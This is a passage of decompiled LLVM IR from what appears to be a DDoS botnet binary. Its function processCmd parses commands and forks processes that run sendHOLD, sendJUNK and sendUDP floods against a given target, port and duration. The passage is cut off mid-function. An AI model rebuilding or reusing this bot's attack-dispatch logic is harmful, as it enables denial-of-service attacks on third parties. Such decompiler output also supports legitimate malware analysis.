  uselistorder i32 ()* @getdtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_100065a4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100065b4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10006598, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_10006284, { 1, 0 }
  uselistorder label %dec_label_pc_10006234, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %v2_1000661c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000e27c.38 to i32), i32* @r4, align 4
  %v4_1000662c = inttoptr i32 %v2_1000661c to i8*
  %v5_1000662c = call i32 @__GI_strcoll(i8* %v4_1000662c, i32 ptrtoint ([5 x i8]* @global_var_1000e27c.38 to i32), i32 268500992)
  %v3_10006634 = icmp eq i32 %v5_1000662c, 0
  br i1 %v3_10006634, label %dec_label_pc_1000663c, label %dec_label_pc_1000665c

dec_label_pc_1000663c:                            ; preds = %entry
  %v3_10006640 = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint (i32* @global_var_10006658.100 to i32), i32* @lr, align 4
  %v4_10006654 = call i32 @sockprintf(i32 %v3_10006640, i32 ptrtoint ([6 x i8]* @global_var_1000e310.99 to i32), i32 268500992)
  br label %dec_label_pc_10007108

dec_label_pc_1000665c:                            ; preds = %entry
  %v2_10006660 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1000e318.101 to i32), i32* @r4, align 4
  %v4_10006670 = inttoptr i32 %v2_10006660 to i8*
  %v5_10006670 = call i32 @__GI_strcoll(i8* %v4_10006670, i32 ptrtoint ([11 x i8]* @global_var_1000e318.101 to i32), i32 268500992)
  %v3_10006678 = icmp eq i32 %v5_10006670, 0
  br i1 %v3_10006678, label %dec_label_pc_10006680, label %dec_label_pc_100066c0

dec_label_pc_10006680:                            ; preds = %dec_label_pc_1000665c
  %v3_1000668c = load i32, i32* @global_var_1001fdb8.48, align 4
  store i32 %v3_1000668c, i32* %stack_var_-64, align 4
  store i32 268461728, i32* @lr, align 4
  %v3_1000669c = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-64, i32 ptrtoint (i32* @global_var_10020000.2 to i32))
  %v0_100066a4 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_100066bc.103 to i32), i32* @lr, align 4
  %v5_100066b8 = call i32 @sockprintf(i32 %v0_100066a4, i32 ptrtoint ([10 x i8]* @global_var_1000e324.102 to i32), i32 %v3_1000669c)
  br label %dec_label_pc_10007108

dec_label_pc_100066c0:                            ; preds = %dec_label_pc_1000665c
  %v2_100066c4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000e330.104 to i32), i32* @r4, align 4
  %v4_100066d4 = inttoptr i32 %v2_100066c4 to i8*
  %v5_100066d4 = call i32 @__GI_strcoll(i8* %v4_100066d4, i32 ptrtoint ([5 x i8]* @global_var_1000e330.104 to i32), i32 268500992)
  %v3_100066dc = icmp eq i32 %v5_100066d4, 0
  br i1 %v3_100066dc, label %dec_label_pc_100066e4, label %dec_label_pc_10006850

dec_label_pc_100066e4:                            ; preds = %dec_label_pc_100066c0
  %tmp74 = icmp slt i32 %arg1, 4
  br i1 %tmp74, label %dec_label_pc_10007108, label %dec_label_pc_100066f0

dec_label_pc_100066f0:                            ; preds = %dec_label_pc_100066e4
  %v1_100066f4 = add i32 %tmp, 8
  %v1_100066f8 = inttoptr i32 %v1_100066f4 to i32*
  %v2_100066f8 = load i32, i32* %v1_100066f8, align 4
  store i32 268461828, i32* @lr, align 4
  %v2_10006700 = call i32 @atol(i32 %v2_100066f8, i32 %v1_100066f4)
  %tmp75 = icmp slt i32 %v2_10006700, 1
  br i1 %tmp75, label %dec_label_pc_10007108, label %dec_label_pc_10006710

dec_label_pc_10006710:                            ; preds = %dec_label_pc_100066f0
  %v1_10006714 = add i32 %tmp, 12
  %v1_10006718 = inttoptr i32 %v1_10006714 to i32*
  %v2_10006718 = load i32, i32* %v1_10006718, align 4
  store i32 268461860, i32* @lr, align 4
  %v2_10006720 = call i32 @atol(i32 %v2_10006718, i32 %v1_10006714)
  %v2_10006728 = icmp sgt i32 %v2_10006720, 0
  br i1 %v2_10006728, label %dec_label_pc_10006734, label %dec_label_pc_10007108

dec_label_pc_10006734:                            ; preds = %dec_label_pc_10006710
  %v1_10006738 = add i32 %tmp, 4
  %v1_1000673c = inttoptr i32 %v1_10006738 to i32*
  %v2_1000673c = load i32, i32* %v1_1000673c, align 4
  %v2_1000674c = load i32, i32* %v1_100066f8, align 4
  store i32 268461912, i32* @lr, align 4
  %v2_10006754 = call i32 @atol(i32 %v2_1000674c, i32 %v1_100066f4)
  %v2_10006768 = load i32, i32* %v1_10006718, align 4
  store i32 268461940, i32* @lr, align 4
  %v2_10006770 = call i32 @atol(i32 %v2_10006768, i32 %v1_10006714)
  store i32 %v2_1000673c, i32* @r3, align 4
  store i32 268461964, i32* @lr, align 4
  %v2_10006788 = call i32 @__GI_strchr(i32 %v2_1000673c, i32 44)
  %v3_10006790 = icmp eq i32 %v2_10006788, 0
  br i1 %v3_10006790, label %dec_label_pc_10006818, label %dec_label_pc_10006798

dec_label_pc_10006798:                            ; preds = %dec_label_pc_10006734
  store i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32* @r4, align 4
  store i32 268461996, i32* @lr, align 4
  %v3_100067a8 = call i32 @__GI_strtok(i32 %v2_1000673c, i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32 268500992)
  %v3_1000680c31 = icmp eq i32 %v3_100067a8, 0
  br i1 %v3_1000680c31, label %dec_label_pc_10006850, label %dec_label_pc_100067b8

dec_label_pc_100067b8:                            ; preds = %dec_label_pc_10006798, %dec_label_pc_100067f0
  %storemerge1632 = phi i32 [ %v3_100067fc, %dec_label_pc_100067f0 ], [ %v3_100067a8, %dec_label_pc_10006798 ]
  store i32 268462012, i32* @lr, align 4
  %v0_100067b8 = call i32 @listFork()
  %v3_100067c0 = icmp eq i32 %v0_100067b8, 0
  br i1 %v3_100067c0, label %dec_label_pc_100067c8, label %dec_label_pc_100067f0

dec_label_pc_100067c8:                            ; preds = %dec_label_pc_100067b8
  %v3_100067d4 = call i32 @sendHOLD(i32 %storemerge1632, i32 %v2_10006754, i32 %v2_10006770)
  %v3_100067dc = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100067e8.105 to i32), i32* @lr, align 4
  %v1_100067e4 = call i32 @__libc_close(i32 %v3_100067dc)
  %v1_100067ec = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100067f0

dec_label_pc_100067f0:                            ; preds = %dec_label_pc_100067b8, %dec_label_pc_100067c8
  store i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32* @r4, align 4
  store i32 268462080, i32* @lr, align 4
  %v3_100067fc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32 268500992)
  %v3_1000680c = icmp eq i32 %v3_100067fc, 0
  br i1 %v3_1000680c, label %dec_label_pc_10006850, label %dec_label_pc_100067b8

dec_label_pc_10006818:                            ; preds = %dec_label_pc_10006734
  store i32 268462108, i32* @lr, align 4
  %v0_10006818 = call i32 @listFork()
  %v3_10006820 = icmp eq i32 %v0_10006818, 0
  br i1 %v3_10006820, label %dec_label_pc_10006828, label %dec_label_pc_10007108

dec_label_pc_10006828:                            ; preds = %dec_label_pc_10006818
  %v3_10006834 = call i32 @sendHOLD(i32 %v2_1000673c, i32 %v2_10006754, i32 %v2_10006770)
  %v3_1000683c = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006848.107 to i32), i32* @lr, align 4
  %v1_10006844 = call i32 @__libc_close(i32 %v3_1000683c)
  %v1_1000684c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006850

dec_label_pc_10006850:                            ; preds = %dec_label_pc_100067f0, %dec_label_pc_10006798, %dec_label_pc_100066c0, %dec_label_pc_10006828
  %v2_10006854 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000e338.108 to i32), i32* @r4, align 4
  %v4_10006864 = inttoptr i32 %v2_10006854 to i8*
  %v5_10006864 = call i32 @__GI_strcoll(i8* %v4_10006864, i32 ptrtoint ([5 x i8]* @global_var_1000e338.108 to i32), i32 268500992)
  %v3_1000686c = icmp eq i32 %v5_10006864, 0
  br i1 %v3_1000686c, label %dec_label_pc_10006874, label %dec_label_pc_100069e0

dec_label_pc_10006874:                            ; preds = %dec_label_pc_10006850
  %tmp76 = icmp slt i32 %arg1, 4
  br i1 %tmp76, label %dec_label_pc_10007108, label %dec_label_pc_10006880

dec_label_pc_10006880:                            ; preds = %dec_label_pc_10006874
  %v1_10006884 = add i32 %tmp, 8
  %v1_10006888 = inttoptr i32 %v1_10006884 to i32*
  %v2_10006888 = load i32, i32* %v1_10006888, align 4
  store i32 268462228, i32* @lr, align 4
  %v2_10006890 = call i32 @atol(i32 %v2_10006888, i32 %v1_10006884)
  %tmp77 = icmp slt i32 %v2_10006890, 1
  br i1 %tmp77, label %dec_label_pc_10007108, label %dec_label_pc_100068a0

dec_label_pc_100068a0:                            ; preds = %dec_label_pc_10006880
  %v1_100068a4 = add i32 %tmp, 12
  %v1_100068a8 = inttoptr i32 %v1_100068a4 to i32*
  %v2_100068a8 = load i32, i32* %v1_100068a8, align 4
  store i32 268462260, i32* @lr, align 4
  %v2_100068b0 = call i32 @atol(i32 %v2_100068a8, i32 %v1_100068a4)
  %v2_100068b8 = icmp sgt i32 %v2_100068b0, 0
  br i1 %v2_100068b8, label %dec_label_pc_100068c4, label %dec_label_pc_10007108

dec_label_pc_100068c4:                            ; preds = %dec_label_pc_100068a0
  %v1_100068c8 = add i32 %tmp, 4
  %v1_100068cc = inttoptr i32 %v1_100068c8 to i32*
  %v2_100068cc = load i32, i32* %v1_100068cc, align 4
  %v2_100068dc = load i32, i32* %v1_10006888, align 4
  store i32 268462312, i32* @lr, align 4
  %v2_100068e4 = call i32 @atol(i32 %v2_100068dc, i32 %v1_10006884)
  %v2_100068f8 = load i32, i32* %v1_100068a8, align 4
  store i32 268462340, i32* @lr, align 4
  %v2_10006900 = call i32 @atol(i32 %v2_100068f8, i32 %v1_100068a4)
  store i32 %v2_100068cc, i32* @r3, align 4
  store i32 268462364, i32* @lr, align 4
  %v2_10006918 = call i32 @__GI_strchr(i32 %v2_100068cc, i32 44)
  %v3_10006920 = icmp eq i32 %v2_10006918, 0
  br i1 %v3_10006920, label %dec_label_pc_100069a8, label %dec_label_pc_10006928

dec_label_pc_10006928:                            ; preds = %dec_label_pc_100068c4
  store i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32* @r4, align 4
  store i32 268462396, i32* @lr, align 4
  %v3_10006938 = call i32 @__GI_strtok(i32 %v2_100068cc, i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32 268500992)
  %v3_1000699c27 = icmp eq i32 %v3_10006938, 0
  br i1 %v3_1000699c27, label %dec_label_pc_100069e0, label %dec_label_pc_10006948

dec_label_pc_10006948:                            ; preds = %dec_label_pc_10006928, %dec_label_pc_10006980
  %storemerge1428 = phi i32 [ %v3_1000698c, %dec_label_pc_10006980 ], [ %v3_10006938, %dec_label_pc_10006928 ]
  store i32 268462412, i32* @lr, align 4
  %v0_10006948 = call i32 @listFork()
  %v3_10006950 = icmp eq i32 %v0_10006948, 0
  br i1 %v3_10006950, label %dec_label_pc_10006958, label %dec_label_pc_10006980

dec_label_pc_10006958:                            ; preds = %dec_label_pc_10006948
  %v3_10006964 = call i32 @sendJUNK(i32 %storemerge1428, i32 %v2_100068e4, i32 %v2_10006900)
  %v3_1000696c = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006978.109 to i32), i32* @lr, align 4
  %v1_10006974 = call i32 @__libc_close(i32 %v3_1000696c)
  %v1_1000697c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006980

dec_label_pc_10006980:                            ; preds = %dec_label_pc_10006948, %dec_label_pc_10006958
  store i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32* @r4, align 4
  store i32 268462480, i32* @lr, align 4
  %v3_1000698c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32 268500992)
  %v3_1000699c = icmp eq i32 %v3_1000698c, 0
  br i1 %v3_1000699c, label %dec_label_pc_100069e0, label %dec_label_pc_10006948

dec_label_pc_100069a8:                            ; preds = %dec_label_pc_100068c4
  store i32 268462508, i32* @lr, align 4
  %v0_100069a8 = call i32 @listFork()
  %v3_100069b0 = icmp eq i32 %v0_100069a8, 0
  br i1 %v3_100069b0, label %dec_label_pc_100069b8, label %dec_label_pc_10007108

dec_label_pc_100069b8:                            ; preds = %dec_label_pc_100069a8
  %v3_100069c4 = call i32 @sendJUNK(i32 %v2_100068cc, i32 %v2_100068e4, i32 %v2_10006900)
  %v3_100069cc = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100069d8.111 to i32), i32* @lr, align 4
  %v1_100069d4 = call i32 @__libc_close(i32 %v3_100069cc)
  %v1_100069dc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100069e0

dec_label_pc_100069e0:                            ; preds = %dec_label_pc_10006980, %dec_label_pc_10006928, %dec_label_pc_10006850, %dec_label_pc_100069b8
  %v2_100069e4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1000e340.112 to i32), i32* @r4, align 4
  %v4_100069f4 = inttoptr i32 %v2_100069e4 to i8*
  %v5_100069f4 = call i32 @__GI_strcoll(i8* %v4_100069f4, i32 ptrtoint ([4 x i8]* @global_var_1000e340.112 to i32), i32 268500992)
  %v3_100069fc = icmp eq i32 %v5_100069f4, 0
  br i1 %v3_100069fc, label %dec_label_pc_10006a04, label %dec_label_pc_10006cbc

dec_label_pc_10006a04:                            ; preds = %dec_label_pc_100069e0
  %tmp78 = icmp slt i32 %arg1, 6
  br i1 %tmp78, label %dec_label_pc_10007108, label %dec_label_pc_10006a10

dec_label_pc_10006a10:                            ; preds = %dec_label_pc_10006a04
  %v1_10006a14 = add i32 %tmp, 12
  %v1_10006a18 = inttoptr i32 %v1_10006a14 to i32*
  %v2_10006a18 = load i32, i32* %v1_10006a18, align 4
  store i32 268462628, i32* @lr, align 4
  %v2_10006a20 = call i32 @atol(i32 %v2_10006a18, i32 %v1_10006a14)
  %v4_10006a2c = icmp eq i32 %v2_10006a20, -1
  br i1 %v4_10006a2c, label %dec_label_pc_10007108, label %dec_label_pc_10006a34

dec_label_pc_10006a34:                            ; preds = %dec_label_pc_10006a10
  %v1_10006a38 = add i32 %tmp, 8
  %v1_10006a3c = inttoptr i32 %v1_10006a38 to i32*
  %v2_10006a3c = load i32, i32* %v1_10006a3c, align 4
  store i32 268462664, i32* @lr, align 4
  %v2_10006a44 = call i32 @atol(i32 %v2_10006a3c, i32 %v1_10006a38)
  %v4_10006a50 = icmp eq i32 %v2_10006a44, -1
  br i1 %v4_10006a50, label %dec_label_pc_10007108, label %dec_label_pc_10006a58

dec_label_pc_10006a58:                            ; preds = %dec_label_pc_10006a34
  %v1_10006a5c = add i32 %tmp, 16
  %v1_10006a60 = inttoptr i32 %v1_10006a5c to i32*
  %v2_10006a60 = load i32, i32* %v1_10006a60, align 4
  store i32 268462700, i32* @lr, align 4
  %v2_10006a68 = call i32 @atol(i32 %v2_10006a60, i32 %v1_10006a5c)
  %v4_10006a74 = icmp eq i32 %v2_10006a68, -1
  br i1 %v4_10006a74, label %dec_label_pc_10007108, label %dec_label_pc_10006a7c

dec_label_pc_10006a7c:                            ; preds = %dec_label_pc_10006a58
  %v1_10006a80 = add i32 %tmp, 20
  %v1_10006a84 = inttoptr i32 %v1_10006a80 to i32*
  %v2_10006a84 = load i32, i32* %v1_10006a84, align 4
  store i32 268462736, i32* @lr, align 4
  %v2_10006a8c = call i32 @atol(i32 %v2_10006a84, i32 %v1_10006a80)
  %v4_10006a98 = icmp eq i32 %v2_10006a8c, -1
  br i1 %v4_10006a98, label %dec_label_pc_10007108, label %dec_label_pc_10006aa0

dec_label_pc_10006aa0:                            ; preds = %dec_label_pc_10006a7c
  %v2_10006aa8 = load i32, i32* %v1_10006a84, align 4
  store i32 268462772, i32* @lr, align 4
  %v2_10006ab0 = call i32 @atol(i32 %v2_10006aa8, i32 %v1_10006a80)
  %v3_10006ac0 = icmp sgt i32 %v2_10006ab0, 65500
  br i1 %v3_10006ac0, label %dec_label_pc_10007108, label %dec_label_pc_10006ac8

dec_label_pc_10006ac8:                            ; preds = %dec_label_pc_10006aa0
  %v2_10006ad0 = load i32, i32* %v1_10006a60, align 4
  store i32 268462812, i32* @lr, align 4
  %v2_10006ad8 = call i32 @atol(i32 %v2_10006ad0, i32 %v1_10006a5c)
  %v2_10006ae0 = icmp sgt i32 %v2_10006ad8, 32
  br i1 %v2_10006ae0, label %dec_label_pc_10007108, label %dec_label_pc_10006ae8

dec_label_pc_10006ae8:                            ; preds = %dec_label_pc_10006ac8
  %v3_10006aec = icmp eq i32 %arg1, 7
  br i1 %v3_10006aec, label %dec_label_pc_10006af4, label %dec_label_pc_10006b18

dec_label_pc_10006af4:                            ; preds = %dec_label_pc_10006ae8
  %v1_10006af8 = add i32 %tmp, 24
  %v1_10006afc = inttoptr i32 %v1_10006af8 to i32*
  %v2_10006afc = load i32, i32* %v1_10006afc, align 4
  store i32 268462856, i32* @lr, align 4
  %v2_10006b04 = call i32 @atol(i32 %v2_10006afc, i32 %v1_10006af8)
  %v2_10006b0c = icmp sgt i32 %v2_10006b04, 0
  br i1 %v2_10006b0c, label %dec_label_pc_10006b18, label %dec_label_pc_10007108

dec_label_pc_10006b18:                            ; preds = %dec_label_pc_10006ae8, %dec_label_pc_10006af4
  %v1_10006b1c = add i32 %tmp, 4
  %v1_10006b20 = inttoptr i32 %v1_10006b1c to i32*
  %v2_10006b20 = load i32, i32* %v1_10006b20, align 4
  %v2_10006b30 = load i32, i32* %v1_10006a3c, align 4
  store i32 268462908, i32* @lr, align 4
  %v2_10006b38 = call i32 @atol(i32 %v2_10006b30, i32 %v1_10006a38)
  %v2_10006b4c = load i32, i32* %v1_10006a18, align 4
  store i32 268462936, i32* @lr, align 4
  %v2_10006b54 = call i32 @atol(i32 %v2_10006b4c, i32 %v1_10006a14)
  %v2_10006b68 = load i32, i32* %v1_10006a60, align 4
  store i32 268462964, i32* @lr, align 4
  %v2_10006b70 = call i32 @atol(i32 %v2_10006b68, i32 %v1_10006a5c)
  %v2_10006b84 = load i32, i32* %v1_10006a84, align 4
  store i32 268462992, i32* @lr, align 4
  %v2_10006b8c = call i32 @atol(i32 %v2_10006b84, i32 %v1_10006a80)
  br i1 %v3_10006aec, label %dec_label_pc_10006ba4, label %dec_label_pc_10006bc0

dec_label_pc_10006ba4:                            ; preds = %dec_label_pc_10006b18
  %v1_10006ba8 = add i32 %tmp, 24
  %v1_10006bac = inttoptr i32 %v1_10006ba8 to i32*
  %v2_10006bac = load i32, i32* %v1_10006bac, align 4
  store i32 268463032, i32* @lr, align 4
  %v2_10006bb4 = call i32 @atol(i32 %v2_10006bac, i32 %v1_10006ba8)
  br label %dec_label_pc_10006bc8

dec_label_pc_10006bc0:                            ; preds = %dec_label_pc_10006b18
  br label %dec_label_pc_10006bc8

dec_label_pc_10006bc8:                            ; preds = %dec_label_pc_10006ba4, %dec_label_pc_10006bc0
  %storemerge5 = phi i32 [ 10, %dec_label_pc_10006bc0 ], [ %v2_10006bb4, %dec_label_pc_10006ba4 ]
  store i32 %v2_10006b20, i32* @r3, align 4
  store i32 268463072, i32* @lr, align 4
  %v2_10006bdc = call i32 @__GI_strchr(i32 %v2_10006b20, i32 44)
  %v3_10006be4 = icmp eq i32 %v2_10006bdc, 0
  br i1 %v3_10006be4, label %dec_label_pc_10006c78, label %dec_label_pc_10006bec

dec_label_pc_10006bec:                            ; preds = %dec_label_pc_10006bc8
  store i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32* @r4, align 4
  store i32 268463104, i32* @lr, align 4
  %v3_10006bfc = call i32 @__GI_strtok(i32 %v2_10006b20, i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32 268500992)
  %v3_10006c6c23 = icmp eq i32 %v3_10006bfc, 0
  br i1 %v3_10006c6c23, label %dec_label_pc_10006cbc, label %dec_label_pc_10006c0c

dec_label_pc_10006c0c:                            ; preds = %dec_label_pc_10006bec, %dec_label_pc_10006c50
  %storemerge1224 = phi i32 [ %v3_10006c5c, %dec_label_pc_10006c50 ], [ %v3_10006bfc, %dec_label_pc_10006bec ]
  store i32 268463120, i32* @lr, align 4
  %v0_10006c0c = call i32 @listFork()
  %v3_10006c14 = icmp eq i32 %v0_10006c0c, 0
  br i1 %v3_10006c14, label %dec_label_pc_10006c1c, label %dec_label_pc_10006c50

dec_label_pc_10006c1c:                            ; preds = %dec_label_pc_10006c0c
  %v6_10006c34 = call i32 @sendUDP(i32 %storemerge1224, i32 %v2_10006b38, i32 %v2_10006b54, i32 %v2_10006b70, i32 %v2_10006b8c, i32 %storemerge5)
  %v3_10006c3c = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006c48.113 to i32), i32* @lr, align 4
  %v1_10006c44 = call i32 @__libc_close(i32 %v3_10006c3c)
  %v1_10006c4c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006c50

dec_label_pc_10006c50:                            ; preds = %dec_label_pc_10006c0c, %dec_label_pc_10006c1c
  store i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32* @r4, align 4
  store i32 268463200, i32* @lr, align 4
  %v3_10006c5c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32 268500992)
  %v3_10006c6c = icmp eq i32 %v3_10006c5c, 0
  br i1 %v3_10006c6c, label %dec_label_pc_10006cbc, label %dec_label_pc_10006c0c

dec_label_pc_10006c78:                            ; preds = %dec_label_pc_10006bc8
  store i32 268463228, i32* @lr, align 4
  %v0_10006c78 = call i32 @listFork()
  %v3_10006c80 = icmp eq i32 %v0_10006c78, 0
  br i1 %v3_10006c80, label %dec_label_pc_10006c88, label %dec_label_pc_10007108

dec_label_pc_10006c88:                            ; preds = %dec_label_pc_10006c78
  %v6_10006ca0 = call i32 @sendUDP(i32 %v2_10006b20, i32 %v2_10006b38, i32 %v2_10006b54, i32 %v2_10006b70, i32 %v2_10006b8c, i32 %storemerge5)
  %v3_10006ca8 = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006cb4.115 to i32), i32* @lr, align 4
  %v1_10006cb0 = call i32 @__libc_close(i32 %v3_10006ca8)
  %v1_10006cb8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006cbc

dec_label_pc_10006cbc:                            ; preds = %dec_label_pc_10006c50, %dec_label_pc_10006bec, %dec_label_pc_100069e0, %dec_label_pc_10006c88
  %v2_10006cc0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1000e344.116 to i32), i32* @r4, align 4
  %v4_10006cd0 = inttoptr i32 %v2_10006cc0 to i8*
  %v5_10006cd0 = call i32 @__GI_strcoll(i8* %v4_10006cd0, i32 ptrtoint ([4 x i8]* @global_var_1000e344.116 to i32), i32 268500992)
  %v3_10006cd8 = icmp eq i32 %v5_10006cd0, 0
  br i1 %v3_10006cd8, label %dec_label_pc_10006ce0, label %dec_label_pc_10006fac

dec_label_pc_10006ce0:                            ; preds = %dec_label_pc_10006cbc
  %tmp79 = icmp slt i32 %arg1, 6
  br i1 %tmp79, label %dec_label_pc_10007108, label %dec_label_pc_10006cec

dec_label_pc_10006cec:                            ; preds = %dec_label_pc_10006ce0
  %v1_10006cf0 = add i32 %tmp, 12
  %v1_10006cf4 = inttoptr i32 %v1_10006cf0 to i32*
  %v2_10006cf4 = load i32, i32* %v1_10006cf4, align 4
  store i32 268463360, i32* @lr, align 4
  %v2_10006cfc = call i32 @atol(i32 %v2_10006cf4, i32 %v1_10006cf0)
  %v4_10006d08 = icmp eq i32 %v2_10006cfc, -1
  br i1 %v4_10006d08, label %dec_label_pc_10007108, label %dec_label_pc_10006d10

dec_label_pc_10006d10:                            ; preds = %dec_label_pc_10006cec
  %v1_10006d14 = add i32 %tmp, 8
  %v1_10006d18 = inttoptr i32 %v1_10006d14 to i32*
  %v2_10006d18 = load i32, i32* %v1_10006d18, align 4
  store i32 268463396, i32* @lr, align 4
  %v2_10006d20 = call i32 @atol(i32 %v2_10006d18, i32 %v1_10006d14)
  %v4_10006d2c = icmp eq i32 %v2_10006d20, -1
  br i1 %v4_10006d2c, label %dec_label_pc_10007108, label %dec_label_pc_10006d34

dec_label_pc_10006d34:                            ; preds = %dec_label_pc_10006d10
  %v1_10006d38 = add i32 %tmp, 16
  %v1_10006d3c = inttoptr i32 %v1_10006d38 to i32*
  %v2_10006d3c = load i32, i32* %v1_10006d3c, align 4
  store i32 268463432, i32* @lr, align 4
  %v2_10006d44 = call i32 @atol(i32 %v2_10006d3c, i32 %v1_10006d38)
  %v4_10006d50 = icmp eq i32 %v2_10006d44, -1
  br i1 %v4_10006d50, label %dec_label_pc_10007108, label %dec_label_pc_10006d58

dec_label_pc_10006d58:                            ; preds = %dec_label_pc_10006d34
  %v2_10006d60 = load i32, i32* %v1_10006d3c, align 4
  store i32 268463468, i32* @lr, align 4
  %v2_10006d68 = call i32 @atol(i32 %v2_10006d60, i32 %v1_10006d38)
  %v2_10006d70 = icmp sgt i32 %v2_10006d68, 32
  br i1 %v2_10006d70, label %dec_label_pc_10007108, label %dec_label_pc_10006d78

dec_label_pc_10006d78:                            ; preds = %dec_label_pc_10006d58
  %tmp80 = icmp slt i32 %arg1, 7
  br i1 %tmp80, label %dec_label_pc_10006da4, label %dec_label_pc_10006d84

dec_label_pc_10006d84:                            ; preds = %dec_label_pc_10006d78
  %v1_10006d88 = add i32 %tmp, 24
  %v1_10006d8c = inttoptr i32 %v1_10006d88 to i32*
  %v2_10006d8c = load i32, i32* %v1_10006d8c, align 4
  store i32 268463512, i32* @lr, align 4
  %v2_10006d94 = call i32 @atol(i32 %v2_10006d8c, i32 %v1_10006d88)
  %v1_10006d9c = icmp slt i32 %v2_10006d94, 0
  br i1 %v1_10006d9c, label %dec_label_pc_10007108, label %dec_label_pc_10006da4

dec_label_pc_10006da4:                            ; preds = %dec_label_pc_10006d84, %dec_label_pc_10006d78
  %v3_10006da8 = icmp eq i32 %arg1, 8
  br i1 %v3_10006da8, label %dec_label_pc_10006db0, label %dec_label_pc_10006dd4

dec_label_pc_10006db0:                            ; preds = %dec_label_pc_10006da4
  %v1_10006db4 = add i32 %tmp, 28
  %v1_10006db8 = inttoptr i32 %v1_10006db4 to i32*
  %v2_10006db8 = load i32, i32* %v1_10006db8, align 4
  store i32 268463556, i32* @lr, align 4
  %v2_10006dc0 = call i32 @atol(i32 %v2_10006db8, i32 %v1_10006db4)
  %v2_10006dc8 = icmp sgt i32 %v2_10006dc0, 0
  br i1 %v2_10006dc8, label %dec_label_pc_10006dd4, label %dec_label_pc_10007108

dec_label_pc_10006dd4:                            ; preds = %dec_label_pc_10006da4, %dec_label_pc_10006db0
  %v1_10006dd8 = add i32 %tmp, 4
  %v1_10006ddc = inttoptr i32 %v1_10006dd8 to i32*
  %v2_10006ddc = load i32, i32* %v1_10006ddc, align 4
  %v2_10006dec = load i32, i32* %v1_10006d18, align 4
  store i32 268463608, i32* @lr, align 4
  %v2_10006df4 = call i32 @atol(i32 %v2_10006dec, i32 %v1_10006d14)
  %v2_10006e08 = load i32, i32* %v1_10006cf4, align 4
  store i32 268463636, i32* @lr, align 4
  %v2_10006e10 = call i32 @atol(i32 %v2_10006e08, i32 %v1_10006cf0)
  %v2_10006e24 = load i32, i32* %v1_10006d3c, align 4
  store i32 268463664, i32* @lr, align 4
  %v2_10006e2c = call i32 @atol(i32 %v2_10006e24, i32 %v1_10006d38)
  %v1_10006e3c = add i32 %tmp, 20
  %v1_10006e40 = inttoptr i32 %v1_10006e3c to i32*
  %v2_10006e40 = load i32, i32* %v1_10006e40, align 4
  br i1 %v3_10006da8, label %dec_label_pc_10006e54, label %dec_label_pc_10006e70

dec_label_pc_10006e54:                            ; preds = %dec_label_pc_10006dd4
  %v1_10006e58 = add i32 %tmp, 28
  %v1_10006e5c = inttoptr i32 %v1_10006e58 to i32*
  %v2_10006e5c = load i32, i32* %v1_10006e5c, align 4
  store i32 268463720, i32* @lr, align 4
  %v2_10006e64 = call i32 @atol(i32 %v2_10006e5c, i32 %v1_10006e58)
  br label %dec_label_pc_10006e78

dec_label_pc_10006e70:                            ; preds = %dec_label_pc_10006dd4
  br label %dec_label_pc_10006e78

dec_label_pc_10006e78:                            ; preds = %dec_label_pc_10006e54, %dec_label_pc_10006e70
  %storemerge3 = phi i32 [ 10, %dec_label_pc_10006e70 ], [ %v2_10006e64, %dec_label_pc_10006e54 ]
  br i1 %tmp80, label %dec_label_pc_10006ea8, label %dec_label_pc_10006e8c

dec_label_pc_10006e8c:                            ; preds = %dec_label_pc_10006e78
  %v1_10006e90 = add i32 %tmp, 24
  %v1_10006e94 = inttoptr i32 %v1_10006e90 to i32*
  %v2_10006e94 = load i32, i32* %v1_10006e94, align 4
